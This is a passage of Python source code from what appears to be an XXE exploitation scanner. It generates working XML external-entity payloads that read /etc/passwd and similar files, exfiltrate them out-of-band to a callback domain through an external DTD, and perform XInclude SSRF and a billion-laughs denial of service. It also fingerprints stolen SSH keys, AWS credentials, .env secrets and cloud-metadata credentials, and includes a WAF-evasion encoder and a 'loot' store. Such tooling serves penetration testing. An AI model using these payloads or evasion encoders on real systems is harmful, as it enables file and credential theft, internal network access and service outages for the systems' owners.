  %eval;
  %error;
]>
<root>test</root>'''

    @staticmethod
    def parameter_entity_dns_raw(callback_domain: str) -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % pe SYSTEM "http://{callback_domain}/pe-dns">
  %pe;
]>
<root>test</root>'''

    @staticmethod
    def cdata_external_dtd(dtd_url: str,
                           callback_domain: str,
                           file_path: str = "/etc/passwd") -> Tuple[str, str]:
        xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file://{file_path}">
  <!ENTITY % dtd SYSTEM "{dtd_url}">
  %dtd;
]>
<root>&send;</root>'''
        dtd = (
            '<!ENTITY % start "<![CDATA[">\n'
            '<!ENTITY % end "]]>">\n'
            f'<!ENTITY % all "<!ENTITY &#x25; send SYSTEM '
            f'\'http://{callback_domain}/?data=%start;%file;%end;\'>">\n'
            '%all;'
        )
        return xml, dtd

    @staticmethod
    def utf16_classic(file_path: str = "/etc/passwd") -> bytes:
        xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>'''
        return xml.encode("utf-16")

    @staticmethod
    def utf7_classic(file_path: str = "/etc/passwd") -> bytes:
        xml = f'''<?xml version="1.0" encoding="UTF-7"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>'''
        return xml.encode("utf-7")

    @staticmethod
    def xinclude_file(file_path: str = "/etc/passwd") -> str:
        return f'''<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file://{file_path}" parse="text"/>
</root>'''

    @staticmethod
    def xinclude_ssrf(target_url: str) -> str:
        return f'''<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="{target_url}" parse="text"/>
</root>'''

    @staticmethod
    def svg_xxe(file_path: str = "/etc/passwd") -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>'''

    @staticmethod
    def saml_xxe(file_path: str = "/etc/passwd") -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE saml:Assertion [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                IssueInstant="2024-01-01T00:00:00Z"
                Version="2.0">
  <saml:Issuer>test</saml:Issuer>
  <saml:Subject>&xxe;</saml:Subject>
</saml:Assertion>'''

    @staticmethod
    def soap_xxe(file_path: str = "/etc/passwd") -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>&xxe;</test>
  </soap:Body>
</soap:Envelope>'''

    @staticmethod
    def timing_probe_sleep() -> str:
        return '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://192.0.2.1/xxe-timing-probe">
]>
<root>&xxe;</root>'''

    @staticmethod
    def billion_laughs() -> str:
        return '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>'''


# ---------------------------------------------------------------------------
# Local DTD enumeration
# ---------------------------------------------------------------------------

def _iter_local_dtds():
    for path, names in XXEPayloadGenerator.LOCAL_DTDS:
        if any(c in path for c in "*?["):
            for m in _glob.glob(path):
                yield m, names
        else:
            yield path, names

def _short_label_for(path: str) -> str:
    p = path.replace("\\", "/").rstrip("/")
    base = p.rsplit("/", 1)[-1] or "file"
    label = re.sub(r"[^a-z0-9]+", "-", base.lower()).strip("-")
    return label or "file"

# ---------------------------------------------------------------------------
# Accuracy Engine
# ---------------------------------------------------------------------------

class AccuracyEngine:

    WEIGHTS = {
        "file_indicator": 40,
        "oob_callback_correlated": 50,
        "oob_callback_uncorrelated": 15,
        "parser_error_delta": 20,
        "chain_integrity": 25,
        "timing_anomaly_confirmed": 20,
        "length_delta": 10,
        "status_shift": 5,
        "reflection_veto": -100,
        "reflection_penalty_soft": -30,
        "no_change_veto": -50,
        "baseline_match_veto": -75,
        "entropy_anomaly": 20,
    }

    CLOUD_METADATA_FINGERPRINTS = {
        # AWS IMDS.
        "aws_imds": [
            "ami-id",
            "instance-id",
            "instance-type",
            "instance-life-cycle",
            "iam/security-credentials",
            "placement/availability-zone",
            "reservation-id",
            "public-keys",
        ],

        # GCP metadata.
        "gcp_metadata": [
            "computeMetadata",
            "instance/service-accounts",
            "project/project-id",
            "numeric-project-id",
            "instance/zone",
            "instance/hostname",
        ],

        # Azure IMDS.
        "azure_imds": [
            "vmId",
            "subscriptionId",
            "resourceGroupName",
            "azEnvironment",
            "vmScaleSetName",
            "osProfile",
        ],

        # Alibaba Cloud. The RAM credential path is the highest-value one.
        "alibaba_metadata": [
            "ram/security-credentials",
            "region-id",
            "zone-id",
            "image-id",
            "instance/max-netbw-egress",
        ],

        # Oracle Cloud (OCI).
        "oci_metadata": [
            "compartmentId",
            "availabilityDomain",
            "ociAdName",
            "opc/v1",
        ],

        # Kubernetes service-account API.
        "k8s_metadata": [
            "kube-system",
            "serviceaccount",
            "kind",
            "apiVersion",
            "SecretList",
        ],
    }

    FILE_FINGERPRINTS = {
        # Linux system files
        "/etc/passwd": ["root:x:0:0:", "daemon:x:", "bin:x:",
                        "sys:x:", "nobody:x:"],
        "/etc/shadow": ["root:*:", "root:$", "daemon:*:"],
        "/etc/issue":  ["\\n \\l", "\\r \\m", "Kernel \\r on an \\m"],

        # /proc
        "proc_version": ["Linux version ", "SMP PREEMPT", "gcc version"],
        "proc_mounts":  [" /proc proc ", " /sys sysfs ", "ext4", "overlay"],
        "proc_environ": ["PATH=", "HOME=", "PWD=", "SHLVL="],
        "proc_net_arp": ["IP address", "HW type", "Flags Mask", "HW address"],

        # Credentials
        "ssh_private_key": [
            "-----BEGIN RSA PRIVATE KEY-----",
            "-----BEGIN OPENSSH PRIVATE KEY-----",
            "-----BEGIN DSA PRIVATE KEY-----",
            "-----BEGIN EC PRIVATE KEY-----",
            "-----BEGIN PRIVATE KEY-----",
        ],
        "aws_credentials": [
            "aws_access_key_id",
            "aws_secret_access_key",
        ],

        # Web application source / config
        "php_source": ["<?php"],
        ".env": ["DB_PASSWORD=", "SECRET_KEY=", "AWS_ACCESS_KEY_ID",
                 "AWS_SECRET_ACCESS_KEY", "APP_KEY="],

        # Windows
        "win.ini":     ["[extensions]", "for 16-bit app support", "[fonts]"],
        "system.ini":  ["[386Enh]", "[drivers]", "[boot.description]"],
        "boot.ini":    ["[boot loader]", "[operating systems]",
                        "multi(0)disk(0)"],
        "web.config":  ["<configuration>", "<system.web>",
                        "<connectionStrings>", "<appSettings>"],
        "unattend.xml": ["<unattend", "<settings pass=", "<component name="],
    }

    FILE_MIN_INDICATORS = {
        "/etc/passwd": 2,
        "/etc/shadow": 1,
        "/etc/issue":  2,
        "proc_version": 2,
        "proc_mounts":  2,
        "proc_environ": 2,
        "proc_net_arp": 2,
        "ssh_private_key": 1,
        "aws_credentials": 2,
        "php_source":   1,
        ".env":         2,
        "win.ini":      2,
        "system.ini":   2,
        "boot.ini":     2,
        "web.config":   2,
        "unattend.xml": 2,
    }

    PARSER_ERRORS = {
        "high": [
            "SAXParseException", "XMLSyntaxError", "XmlException",
            "org.xml.sax.SAXParseException", "lxml.etree.XMLSyntaxError",
            "System.Xml.XmlException",
        ],
        "medium": [
            "DOCTYPE", "External entity", "external entity",
            "entity expansion", "Entity expansion",
            "XMLReader", "DocumentBuilder", "XMLStreamReader",
        ],
        "low": ["XML", "parse", "syntax", "entity"],
    }

    @staticmethod
    def detect_file_fingerprint(body: str) -> Tuple[Optional[str], int]:
        for file_type, indicators in AccuracyEngine.FILE_FINGERPRINTS.items():
            matches = [ind for ind in indicators if ind in body]
            if len(matches) >= AccuracyEngine.FILE_MIN_INDICATORS.get(file_type, 2):
                return file_type, len(matches)
        return None, 0

    @staticmethod
    def detect_cloud_metadata(body: str) -> Tuple[Optional[str], int]:
        for provider, indicators in AccuracyEngine.CLOUD_METADATA_FINGERPRINTS.items():
            matches = [ind for ind in indicators if ind.lower() in body.lower()]
            if matches:
                return provider, len(matches)
        return None, 0

    @staticmethod
    def detect_parser_error(body: str) -> Tuple[Optional[str], str]:
        for level in ("high", "medium", "low"):
            for sig in AccuracyEngine.PARSER_ERRORS[level]:
                if sig in body:
                    return sig, level
        return None, "none"

    @staticmethod
    def is_reflected(body: str, payload: str) -> bool:
        if not body or not payload:
            return False

        try:
            body_decoded = unquote(body)
        except Exception:
            body_decoded = body

        norm_payload = re.sub(r"\s+", "", payload)
        norm_body = re.sub(r"\s+", "", body_decoded)

        if len(norm_payload) < 40:
            return norm_payload in norm_body

        probes = (
            norm_payload[:40],
            norm_payload[len(norm_payload) // 3:
                         len(norm_payload) // 3 + 40],
            norm_payload[-40:],
        )
        return any(p and p in norm_body for p in probes)

    @staticmethod
    def is_no_change(resp_body: str, baseline: 'StatisticalBaseline') -> bool:
        try:
            h = hashlib.md5(resp_body.encode()).hexdigest()
            return h == baseline.median_body_hash
        except Exception:
            return False

    @staticmethod
    def is_baseline_match_normalized(resp_body: str,
                                     baseline: 'StatisticalBaseline') -> bool:
        if not resp_body or not baseline.body:
            return False

        n = len(baseline.body)
        resp_slice = resp_body[:n]

        def normalize(s):
            s = re.sub(r'\s+', '', s.lower())
            s = re.sub(r'\b[0-9a-f]{32,}\b', '', s)
            s = re.sub(r'\b\d{10,}\b', '', s)
            s = re.sub(r'\bcsrf[_-]?token[=:]\S+', '', s)
            s = re.sub(r'\bsession[_-]?id[=:]\S+', '', s)
            return s

        return normalize(resp_slice) == normalize(baseline.body)

    @staticmethod
    def shannon_entropy_bytes(data: bytes) -> float:
        if not data:
            return 0.0
        counts = [0] * 256
        for b in data:
            counts[b] += 1
        n = len(data)
        ent = 0.0
        for c in counts:
            if c:
                p = c / n
                ent -= p * math.log2(p)
        return ent

    @staticmethod
    def windowed_entropy(data: bytes,
                         window: int = 256,
                         step: int = 128,
                         max_bytes: int = 16_384) -> float:
        if not data:
            return 0.0
        if len(data) > max_bytes:
            data = data[:max_bytes]
        if len(data) < window:
            return AccuracyEngine.shannon_entropy_bytes(data)
        best = 0.0
        for i in range(0, len(data) - window + 1, step):
            e = AccuracyEngine.shannon_entropy_bytes(data[i:i + window])
            if e > best:
                best = e
        return best

    @staticmethod
    def compute_entropy(text: str) -> float:
        if not text:
            return 0.0
        entropy = 0.0
        length = len(text)
        for char in set(text):
            p = text.count(char) / length
            if p > 0:
                entropy -= p * math.log2(p)
        return entropy

    MARKUP_TAGS = ("<html", "<!doctype", "<head", "<body", "<div",
                   "<script", "<meta", "<svg", "<root", "<?xml")

    @staticmethod
    def looks_like_markup(body: str) -> bool:
        if not body:
            return False
        head = body[:2048].lower()
        return any(tag in head for tag in AccuracyEngine.MARKUP_TAGS)

    @staticmethod
    def score(baseline: 'StatisticalBaseline',
              resp: httpx.Response,
              payload: str, elapsed: float,
              oob_hit: bool = False,
              oob_correlated: bool = False,
              chain_integrity: bool = False) -> Tuple[int, Dict[str, Any], List[str]]:

        body = resp.text or ""
        reasons: List[str] = []
        evidence: Dict[str, Any] = {}
        total = 0

        file_type, ind_count = AccuracyEngine.detect_file_fingerprint(body)
        err_sig, err_level = AccuracyEngine.detect_parser_error(body)
        resp_is_markup = AccuracyEngine.looks_like_markup(body)

        strong_signal = bool(
            (file_type and ind_count >= 2 and not resp_is_markup)
            or oob_correlated
            or chain_integrity
            or (err_sig and err_level == "high")
        )

        if AccuracyEngine.is_reflected(body, payload):
            if strong_signal:
                total += AccuracyEngine.WEIGHTS["reflection_penalty_soft"]
                evidence["reflection_downgraded"] = True
                reasons.append("Payload reflected, but strong signal present "
                               "— reflection treated as noise")
            else:
                return AccuracyEngine.WEIGHTS["reflection_veto"], \
                       {"veto": "payload_reflected"}, \
                       ["Payload reflected verbatim — no entity resolution"]

        if not strong_signal and AccuracyEngine.is_no_change(body, baseline):
            return AccuracyEngine.WEIGHTS["no_change_veto"], \
                   {"veto": "no_change"}, \
                   ["Response identical to baseline"]

        if not strong_signal and AccuracyEngine.is_baseline_match_normalized(body, baseline):
            return AccuracyEngine.WEIGHTS["baseline_match_veto"], \
                   {"veto": "normalized_match"}, \
                   ["Response matches baseline after normalization"]

        if (file_type and ind_count >= 2
                and not resp_is_markup
                and not baseline.body_contains(file_type)):
            weight = AccuracyEngine.WEIGHTS["file_indicator"] + (ind_count - 1) * 5
            total += weight
            evidence["file_type"] = file_type
            evidence["indicators_matched"] = ind_count
            reasons.append(f"File fingerprint '{file_type}' matched "
                           f"({ind_count} indicator(s))")

        if err_sig and not baseline.body_contains(err_sig):
            level_weights = {"high": 20, "medium": 15, "low": 5}
            total += level_weights.get(err_level, 5)
            evidence["parser_error"] = err_sig
            evidence["error_confidence"] = err_level
            reasons.append(f"Parser error '{err_sig}' ({err_level}) "
                           f"present only in XXE response")

        if chain_integrity:
            total += AccuracyEngine.WEIGHTS["chain_integrity"]
            evidence["chain_integrity"] = True
            reasons.append("Full entity chain resolved")

        resp_len = len(body.encode("utf-8", errors="ignore"))
        if baseline.is_length_anomaly(resp_len):
            total += AccuracyEngine.WEIGHTS["length_delta"]
            evidence["baseline_length"] = baseline.median_length
            evidence["response_length"] = resp_len
            reasons.append(f"Response length {resp_len} vs baseline "
                           f"{baseline.median_length} (>20% delta)")

        if baseline.is_status_shift(resp.status_code):
            total += AccuracyEngine.WEIGHTS["status_shift"]
            evidence["baseline_status"] = baseline.median_status
            evidence["response_status"] = resp.status_code
            reasons.append(f"Status shifted {baseline.median_status} → "
                           f"{resp.status_code}")

        if baseline.is_timing_anomaly_confirmed(elapsed):
            total += AccuracyEngine.WEIGHTS["timing_anomaly_confirmed"]
            evidence["baseline_elapsed"] = round(baseline.median_elapsed, 3)
            evidence["response_elapsed"] = round(elapsed, 3)
            reasons.append(f"Confirmed timing anomaly: {elapsed:.2f}s vs "
                           f"{baseline.median_elapsed:.2f}s baseline")

        if baseline.median_length >= 256:
            resp_win = AccuracyEngine.windowed_entropy(
                (resp.content or b"")[:8192]
            )
            base_win = baseline.median_window_entropy
            delta = resp_win - base_win
            if delta > 0.5:
                entropy_cap = AccuracyEngine.WEIGHTS["entropy_anomaly"]
                weight = min(entropy_cap, int(5 + (delta - 0.5) * 4.3))
                total += weight
                evidence["baseline_window_entropy"] = round(base_win, 3)
                evidence["response_window_entropy"] = round(resp_win, 3)
                evidence["entropy_delta"] = round(delta, 3)
                reasons.append(
                    f"Windowed entropy +{delta:.2f} bits/byte "
                    f"({base_win:.2f} → {resp_win:.2f})"
                )

        if oob_hit:
            if oob_correlated:
                total += AccuracyEngine.WEIGHTS["oob_callback_correlated"]
                evidence["oob_correlated"] = True
                reasons.append("Correlated OOB callback (token verified)")
            else:
                total += AccuracyEngine.WEIGHTS["oob_callback_uncorrelated"]
                evidence["oob_uncorrelated"] = True
                reasons.append("Uncorrelated OOB callback")

        return total, evidence, reasons

    @staticmethod
    def classify(score: int, has_mandatory: bool,
                 independent: int = 0) -> Tuple[str, bool, str]:
        if not has_mandatory:
            return "theoretical", False, "INFO"
        if score >= 70 and independent >= 2:
            return "confirmed", True, "CRITICAL"
        if score >= 45:
            return "potential", False, "HIGH"
        if score >= 25:
            return "potential", False, "MEDIUM"
        return "theoretical", False, "LOW"


# ---------------------------------------------------------------------------
# Statistical Baseline
# ---------------------------------------------------------------------------

class StatisticalBaseline:

    def __init__(self):
        self.samples: List[Dict[str, Any]] = []
        self.median_length: int = 0
        self.median_elapsed: float = 0.0
        self.p95_elapsed: float = 0.0
        self.iqr_elapsed: float = 0.0
        self.median_body_hash: str = ""
        self.median_status: int = 0
        self.body: str = ""
        self.median_entropy: float = 0.0
        self._all_bodies: List[str] = []
        self._all_body_hashes: Set[str] = set()
        self.median_window_entropy: float = 0.0

    def capture(self, session: "httpx.Client", url: str,
                headers: Dict[str, str], timeout,
                samples: int = BASELINE_SAMPLES) -> bool:
        benign = '<?xml version="1.0"?><root><test>1</test></root>'
        for _ in range(samples):
            start = time.time()
            try:
                resp = session.request(
                    "POST", url, headers=headers,
                    content=benign.encode("utf-8"),
                    timeout=_as_httpx_timeout(timeout),
                    follow_redirects=False,
                )
                elapsed = time.time() - start
                body = resp.text or ""
                win_ent = AccuracyEngine.windowed_entropy(
                    resp.content[:8192]
                )
                entropy = AccuracyEngine.compute_entropy(body)
                self.samples.append({
                    "status": resp.status_code,
                    "length": len(body.encode("utf-8", errors="ignore")),
                    "elapsed": elapsed,
                    "body_hash": hashlib.md5(body.encode()).hexdigest(),
                    "body": body[:4096],
                    "entropy": entropy,
                    "window_entropy": win_ent,
                })
            except Exception:
                pass
            time.sleep(0.15)

        if not self.samples:
            return False

        lengths = [s["length"] for s in self.samples]
        elapsed = [s["elapsed"] for s in self.samples]
        entropies = [s["entropy"] for s in self.samples]
        statuses = [s["status"] for s in self.samples]

        self.median_length = int(statistics.median(lengths))
        self.median_elapsed = statistics.median(elapsed)
        self.median_status = max(set(statuses), key=statuses.count)
        self.median_entropy = statistics.median(entropies)
        self.body = self.samples[0]["body"]
        self._all_bodies = [s["body"] for s in self.samples]
        self._all_body_hashes = {s["body_hash"] for s in self.samples}
        self.median_window_entropy = statistics.median(
            s["window_entropy"] for s in self.samples
        )

        sorted_elapsed = sorted(elapsed)
        n = len(sorted_elapsed)
        if n >= 4:
            q1 = sorted_elapsed[n // 4]
            q3 = sorted_elapsed[(3 * n) // 4]
            self.iqr_elapsed = q3 - q1
        else:
            self.iqr_elapsed = 0.0
        self.p95_elapsed = sorted_elapsed[int(n * 0.95)] if n > 1 else elapsed[0]

        hashes = [s["body_hash"] for s in self.samples]
        self.median_body_hash = max(set(hashes), key=hashes.count)

        dbg(f"Baseline: len={self.median_length}, "
            f"elapsed={self.median_elapsed:.3f}s, "
            f"IQR={self.iqr_elapsed:.3f}s, "
            f"entropy={self.median_entropy:.3f}, "
            f"win_entropy={self.median_window_entropy:.3f}")
        return True

    def is_timing_anomaly_confirmed(self, elapsed: float) -> bool:
        if self.median_elapsed == 0:
            return elapsed > TIMING_MIN_DELTA
        delta = elapsed - self.median_elapsed
        if delta < TIMING_MIN_DELTA:
            return False
        if elapsed / max(self.median_elapsed, 1e-6) < TIMING_DELTA_RATIO:
            return False

        if self.iqr_elapsed > 0:
            return delta >= TIMING_IQR_MULTIPLIER * self.iqr_elapsed

        samples = [s["elapsed"] for s in self.samples]
        if len(samples) >= 2:
            spread = max(samples) - min(samples)
            return delta >= max(spread * 2.0, TIMING_MIN_DELTA)
        return delta >= TIMING_MIN_DELTA

    def is_length_anomaly(self, length: int, threshold: float = 0.20) -> bool:
        if self.median_length == 0:
            return length > 128
        return abs(length - self.median_length) / self.median_length >= threshold

    def is_status_shift(self, status: int) -> bool:
        return status != self.median_status

    def body_contains(self, needle: str) -> bool:
        return any(needle in b for b in self._all_bodies)


# ---------------------------------------------------------------------------
# WAF bypass encoder
# ---------------------------------------------------------------------------

class WafBypassEncoder:

    CONTENT_TYPES = {
        "utf16be":    "application/xml; charset=UTF-16",
        "utf16le":    "application/xml; charset=UTF-16",
        "utf16decl":  "application/xml; charset=UTF-16",
        "utf16nobom": "application/xml; charset=UTF-16",
        "utf32be":    "application/xml; charset=UTF-32",
        "utf32le":    "application/xml; charset=UTF-32",
        "ebcdic":     "application/xml; charset=IBM037",
        "ucs4_2143":  "application/xml; charset=UCS-4",
        "utf8bom":    "application/xml; charset=UTF-8",
    }

    @staticmethod
    def _swap_decl(payload: str, encoding: str) -> str:
        return re.sub(
            r'encoding\s*=\s*["\'][^"\']*["\']',
            f'encoding="{encoding}"',
            payload,
            count=1,
        )

    @staticmethod
    def utf16be(payload: str) -> bytes:
        return b"\xfe\xff" + payload.encode("utf-16-be")

    @staticmethod
    def utf16le(payload: str) -> bytes:
        return b"\xff\xfe" + payload.encode("utf-16-le")

    @staticmethod
    def utf16decl(payload: str) -> bytes:
        p = WafBypassEncoder._swap_decl(payload, "UTF-16")
        return b"\xfe\xff" + p.encode("utf-16-be")

    @staticmethod
    def utf16nobom(payload: str) -> bytes:
        p = WafBypassEncoder._swap_decl(payload, "UTF-16")
        return p.encode("utf-16-be")

    @staticmethod
    def utf32be(payload: str) -> bytes:
        p = WafBypassEncoder._swap_decl(payload, "UTF-32")
        return b"\x00\x00\xfe\xff" + p.encode("utf-32-be")

    @staticmethod
    def utf32le(payload: str) -> bytes:
        p = WafBypassEncoder._swap_decl(payload, "UTF-32")
        return b"\xff\xfe\x00\x00" + p.encode("utf-32-le")

    @staticmethod
    def utf8bom(payload: str) -> bytes:
        return b"\xef\xbb\xbf" + payload.encode("utf-8")

    @staticmethod
    def ebcdic(payload: str) -> bytes:
        p = WafBypassEncoder._swap_decl(payload, "IBM037")
        return p.encode("cp037")

    @staticmethod
    def ucs4_2143(payload: str) -> bytes:
        p = WafBypassEncoder._swap_decl(payload, "UCS-4")
        be = p.encode("utf-32-be")
        out = bytearray(b"\x00\x00\xff\xfe")
        for i in range(0, len(be), 4):
            chunk = be[i:i + 4]
            if len(chunk) < 4:
                out.extend(chunk)
            else:
                out.extend([chunk[1], chunk[0], chunk[3], chunk[2]])
        return bytes(out)

    @staticmethod
    def comment(payload: str) -> str:
        p = payload.replace("<!DOCTYPE", "<!DOC<!---->TYPE")
        p = p.replace("<!ENTITY", "<!EN<!---->TITY")
        return p

    @staticmethod
    def newline(payload: str) -> str:
        p = payload.replace("<!DOCTYPE", "<!DOC\nTYPE")
        p = p.replace("<!ENTITY", "<!EN\nTITY")
        return p

    @staticmethod
    def public(payload: str) -> str:
        p = payload.replace('SYSTEM "file://', 'PUBLIC "-//x//" "file://')
        p = p.replace('SYSTEM "http://', 'PUBLIC "-//x//" "http://')
        p = p.replace('SYSTEM "https://', 'PUBLIC "-//x//" "https://')
        return p

    @staticmethod
    def lower(payload: str) -> str:
        p = payload.replace("<!DOCTYPE", "<!doctype")
        p = p.replace("<!ENTITY", "<!entity")
        p = p.replace(" SYSTEM ", " system ")
        p = p.replace(" PUBLIC ", " public ")
        return p

    @staticmethod
    def charref(payload: str) -> str:
        p = payload.replace('"file://', '"&#x66;ile://')
        p = p.replace('"http://', '"&#x68;ttp://')
        p = p.replace('"https://', '"&#x68;ttps://')
        return p

    @staticmethod
    def b64_uri(payload: str) -> str:
        def _replace(match):
            scheme = match.group(1)
            path = match.group(2)
            uri = f"{scheme}://{path}"
            b64 = base64.b64encode(uri.encode("utf-8")).decode("ascii")
            return f'data:text/plain;base64,{b64}"'

        return re.sub(r'"(file|https?)://([^"]*)"', _replace, payload)

    @staticmethod
    def comment_split_uri(payload: str) -> str:
        p = payload.replace('"file://', '"fi<!-- -->le://')
        p = p.replace('"http://', '"ht<!-- -->tp://')
        p = p.replace('"https://', '"ht<!-- -->tps://')
        return p

    @staticmethod
    def charref_full(payload: str) -> str:
        def _encode(match):
            scheme = match.group(1)
            path = match.group(2)
            uri = f"{scheme}://{path}"
            refs = "".join(f"&#x{ord(c):x};" for c in uri)
            return f'"{refs}"'

        return re.sub(r'"(file|https?)://([^"]*)"', _encode, payload)

    @staticmethod
    def public_charref(payload: str) -> str:
        sys_refs = "".join(f"&#x{ord(c):x};" for c in "SYSTEM")
        return re.sub(
            r'SYSTEM\s+"',
            f'PUBLIC "-//{sys_refs}//" "',
            payload,
        )

    @staticmethod
    def whitespace_pad(payload: str) -> str:
        return re.sub(
            r'^<\?xml(\s+)',
            lambda m: '<?xml' + (' ' * 512),
            payload,
            count=1,
        )

    @staticmethod
    def doctype_closure(payload: str) -> str:
        return re.sub(r'(\]>)', r'\1<!-- -->', payload, count=1)

    @staticmethod
    def pe_stager(payload: str) -> str:
        def _rewrite(m):
            name = m.group(1)
            uri = m.group(2)
            return (f'<!ENTITY % stage "<!ENTITY {name} '
                    f"SYSTEM '{uri}'>\">\n  %stage;")
        return re.sub(
            r'<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)"',
            _rewrite,
            payload,
        )

    @classmethod
    def all_encoders(cls) -> List[Tuple[str, Any]]:
        return [
            # Document encoders — transform the byte stream.
            ("utf16be",           cls.utf16be),
            ("utf16le",           cls.utf16le),
            ("utf16decl",         cls.utf16decl),
            ("utf16nobom",        cls.utf16nobom),
            ("utf32be",           cls.utf32be),
            ("utf32le",           cls.utf32le),
            ("ebcdic",            cls.ebcdic),
            ("ucs4_2143",         cls.ucs4_2143),
            ("utf8bom",           cls.utf8bom),
            # Keyword-evasion encoders.
            ("public",            cls.public),
            ("public_charref",    cls.public_charref),
            ("b64_uri",           cls.b64_uri),
            # Grammar-level obfuscation.
            ("whitespace_pad",    cls.whitespace_pad),
            ("doctype_closure",   cls.doctype_closure),
            # Parameter-entity stager.
            ("pe_stager",         cls.pe_stager),
        ]

    @classmethod
    def selected(cls, names: List[str]) -> List[Tuple[str, Any]]:
        wanted = {n.lower() for n in names}
        return [(n, f) for n, f in cls.all_encoders() if n in wanted]

    @classmethod
    def valid_names(cls) -> List[str]:
        return [n for n, _ in cls.all_encoders()]


def parse_bypass_spec(spec: Optional[str]) -> Optional[List[str]]:
    if spec is None:
        return None
    s = spec.strip()
    if not s:
        return None
    if s.lower() == "all":
        return WafBypassEncoder.valid_names()
    names = [p.strip().lower() for p in s.split(",") if p.strip()]
    valid = set(WafBypassEncoder.valid_names())
    unknown = [n for n in names if n not in valid]
    if unknown:
        raise ValueError(
            f"unknown encoder name(s): {', '.join(unknown)}. "
            f"Valid names: {', '.join(sorted(valid))}, or 'all'."
        )
    return names

# ---------------------------------------------------------------------------
# XXE Detector
# ---------------------------------------------------------------------------

class XXEDetector:

    def __init__(self, url: str, session: "httpx.Client",
                 cookies: CookieManager,
                 oob: Optional[OOBClient] = None,
                 base_request: Optional[Dict] = None,
                 custom_payloads: Optional[CustomPayloadLoader] = None,
                 unsafe: bool = False,
                 proxy: Optional[str] = None,
                 timing_mode: bool = False,
                 rate_limiter: Optional[RateLimiter] = None,
                 ctx: Optional[ScanContext] = None,
                 timeout: Tuple[float, float] = DEFAULT_TIMEOUT,
                 verify_tls: bool = False,
                 no_fingerprint: bool = False,
                 no_fingerprint_cache: bool = False,
                 svg_mode: bool = False,
                 full_file_scan: bool = False,
                 saml_mode: bool = False,
                 bypass_waf_encoders: Optional[List[str]] = None,
                 bypass_waf_include_custom: bool = False,
                 oob_poll_timeout: float = 30.0,
                 event_cb: Optional[Any] = None,
                 dtd_provider: Optional[Any] = None):

        self.url = url
        self.session = session
        self.cookies = cookies
        self.oob = oob
        self.base_request = base_request
        self.custom_payloads = custom_payloads or CustomPayloadLoader()
        self.unsafe = unsafe
        self.proxy = proxy
        self.timing_mode = timing_mode
        self.rate_limiter = rate_limiter
        self.ctx = ctx or ScanContext()
        self.timeout = timeout
        self.verify_tls = verify_tls
        self.oob_poll_timeout = max(1.0, float(oob_poll_timeout))
        self.dtd_provider = dtd_provider
        self.no_fingerprint = no_fingerprint
        self.no_fingerprint_cache = no_fingerprint_cache
        self.svg_mode = svg_mode
        self.saml_mode = saml_mode
        self.bypass_waf_encoders = (
            list(bypass_waf_encoders) if bypass_waf_encoders else None
        )
        self.bypass_waf_include_custom = bypass_waf_include_custom
        self.full_file_scan = full_file_scan
        self.payload_gen = XXEPayloadGenerator()
        self.accuracy = AccuracyEngine()
        self.findings: List[Finding] = []
        self._finding_ids: Set[str] = set()
        self._findings_lock = threading.Lock()
        self.baseline: Optional[StatisticalBaseline] = None
        self.fingerprint: Optional[ParserFingerprint] = None
        self._current_phase: str = "init"
        self._seen_payloads: Dict[str, int] = {}
        self._payload_counter: int = 0
        self._debug_lock = threading.Lock()
        self.skipped_phases: List[Tuple[str, str]] = []
        self.event_cb = event_cb
        self.loot = LootStore()
        self.chain = ChainTracker()

    def add_finding(self, fid: str, severity: str, title: str,
                    description: str, impact: str,
                    confirmed: bool = False,
                    exploitability: str = "theoretical",
                    evidence: Optional[Dict] = None,
                    reasons: Optional[List[str]] = None,
                    confidence: int = 0):
        with self._findings_lock:
            if fid in self._finding_ids:
                for f in self.findings:
                    if f.id == fid:
                        sev_order = ["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"]
                        try:
                            if sev_order.index(severity) > sev_order.index(f.severity):
